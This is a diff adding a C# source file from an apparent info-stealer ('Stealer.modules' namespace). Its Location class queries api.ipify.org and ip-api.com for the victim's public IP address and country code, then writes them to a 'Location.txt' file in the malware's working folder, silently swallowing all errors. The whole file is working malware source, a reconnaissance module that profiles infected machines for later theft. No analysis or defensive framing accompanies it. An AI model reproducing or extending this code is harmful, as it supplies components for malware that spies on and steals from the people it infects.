@@ -1,0 +1,29 @@
+﻿using System;
+using System.Net;
+using System.Xml;
+
+namespace Stealer.modules
+{
+    internal class Location
+    {
+        public static string GetLocation(bool Param)
+        {
+            try
+            {
+                string str1 = Program.path + "\\";
+                string str2 = new WebClient().DownloadString("https://api.ipify.org/");
+                string address = "http://ip-api.com/xml";
+                XmlDocument xmlDocument = new XmlDocument();
+                xmlDocument.LoadXml(new WebClient().DownloadString(address));
+                string str3 = "[" + xmlDocument.GetElementsByTagName("countryCode")[0].InnerText + "]";
+                if (Param)
+                    return str3 + " | " + str2;
+                System.IO.File.WriteAllText(str1 + "Location.txt", str3 + " | " + str2);
+            }
+            catch
+            {
+            }
+            return "";
+        }
+    }
+}
